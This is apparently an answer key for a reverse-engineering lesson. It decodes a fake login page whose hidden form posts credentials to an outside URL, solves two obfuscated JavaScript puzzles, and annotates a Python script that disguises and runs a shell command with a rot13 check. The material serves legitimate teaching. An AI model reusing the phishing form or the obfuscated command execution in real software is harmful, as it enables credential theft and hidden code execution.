# Solutions
This document contains the solutions for the practice problems in this lesson.

# JavaScript
## FakeLoginExample.html
**Objective: Find the URL to which credentials are being exfiltrated.**

By first opening the file, we see that the text is encoded.The frequent `%` signs indicate that this is URL encoded. You can decode the text using the URL decode feature on [CyberChef](https://gchq.github.io/CyberChef). 

After decoding the string, we get a complete HTML framework that has CSS and JS included. The CSS and HTML can be ignored. Usually credentials are exfiltrated through a user input or form which occurs in Javascript. 

Look for JavaScript in the decoded string. There is a script tag in the code:
```javascript
    <script>
      var tag = document.getElementById('tag')
      tag.innerHTML = atob("PGZvcm0gUE9TVD0iaHR0cDovL2FubmFsYW5lcy5jb20vZmlsZXRoaXNhd2F5L3R4dC50eHQiPg==")
    </script>
```

The atob() function is another version of encoding-- Base64. We can use CyberChef to decode the string, which in this case becomes 
```html
<form POST="http://annalanes.com/filethisaway/txt.txt">
```

This code indicates that when the form in the HTML is submitted, the information is sent to the URL `http://annalanes.com/filethisaway/txt.txt`

**Answer: The credentials are exfiltrated to http[:]//annalanes[.]com/filethisaway/txt.txt (not a real website!)**

## reverseJavaScriptExample.js
**Goal: Figure out what line 33 will print out**
```javascript
console['log'](myFunction(0x14, 0xa));
```

First put the entire javascript code into [beautifier.io](https://beautifier.io/). It won't do too much. One of the key tips for reverse engineering is to check outputs, strings, and function calls.

Output: the console.log statement on line 33

Strings: The only strings related to the output are the variables passed into the function `myFunction`, which are `0x14` and `0xa`. These are hexadecimal characters which represent the decimal numbers `20` and `10`, respectively.

Function calls: Let's now analyze the function `myFunction`

```javascript
function myFunction(_0xa4d92a, _0x45c33b) {
  return _0xa4d92a * _0x45c33b;
}
```

We see that this function simply returns the product of the two variables passed into the function. So, the console.log just prints the product of the two numbers passed into it. Since `20` and `10` were passed into the function, the output should be `200`.

The rest of the code was simply added as an obfuscation technique and does nothing. By running the code on [jsconsole](https://jsconsole.com/), you can see that the output is indeed 200.

**Answer: The console will output 200.**

## reverseJavascriptPractice.js
** Goal: find the flag. (The flag format will match the regex `.*{.*}`)**

First put the entire javascript code into [beautifier.io](https://beautifier.io/). It will format it to be a little nicer. One of the key tips for reverse engineering is to check outputs. If you look at the bottom of the beautified JS, you will see:
```javascript
const item = ['a', 'n', 'n', 'a', ':', '!', ')', '{', 'x', 'o', 'y', 'g', 's', 's', 'p', 'p', 'g', 'r', 'l', '}'];
for (let i = 0x0; i < item[_0x361ee1(0x173)]; i++) {
    item[i] !== 'p' && i % 0x5 != 0x0 && console[_0x361ee1(0x16b)](item[i]);
}
```

This is the output statement since we see it has a print console statement. The print console statement conditionals will print any letter in the *item* array that is not equal to 'p' or any item in the array that is not at an indice that is a multiple of 5. If you iterate through the array one by one, you will see that the console will output `nna:){xogssgrl}`

**Answer: the flag is `nna:){xogssgrl}`**


# Python
## reversePython1.py
Objective: Figure out what command line 32 runs.
```python
os.system(command)
```

See the commented code below to see what each line of the code does.

```python
#!/usr/bin/python

#import necessary modules
import sys
import os
import codecs

def setDarkMode():
  # create an array of size 12 that is filled with the value 0
    screenVector = [0] * 12
    # create an array (also of size 12) with all these float integer values
    initialization = [56, 52.5, 55, 51.5, 16, 24.5, 23, 24.5, 23, 24.5, 23, 24.5]

    # iterature through the initialization array
    for pixel in range(len(initialization)):
      # the screenVector array becomes equal to the initialization array values multipled by 2

       screen = initialization[pixel] * 2
       screenVector[pixel] = screen

       # so at the end of the loop, the screenVector array equals = [112,105,110,103,32,49,46,49,46,49,46,49]

    # create an empty string
    mode = ''
    # interate through the screenVector array
    for pixel in range(len(screenVector)):
      # the chr() function takes a numerical value and turns it into its ASCII equivalent. so 112 is 'p' and 105 is 'i', etc. If you take all the ASCII equivalents of the numbers in the screenVector array, the string becomes 'ping 1.1.1.1'
       mode += chr(int(screenVector[pixel]))

    return mode 
    #return the string literal from the function  


def main():
  # if not 2 command line arguments (the file to run <this> and another argument) are passed to the function, print the fatal error 500
    if len(sys.argv) != 2:
        print("Fatal error 500")
        return
    #if the second argument passed to the commandline, when encoded by rot 13, equals `elhxznyjnertebhc` then print out "exiting"
    # this means the string we pass needs to be elhxznyjnertebhc decoded by rot 13 which becomes 'ryukmalwaregroup'.
    # set 'ryukmalwaregroup' as the command line argument to get the code to print 'Exiting'
    elif (sys.argv[1]) == codecs.decode('elhxznyjnertebhc', 'rot_13'):
        print("Exiting")
        return
    else:
        command = setDarkMode()
        # will run the string as a command that setDarkMode() returns, which we established is ping
        # so this will just run a ping command to 1.1.1.1
        os.system(command)

# call main function
if __name__ == "__main__":
  main()
```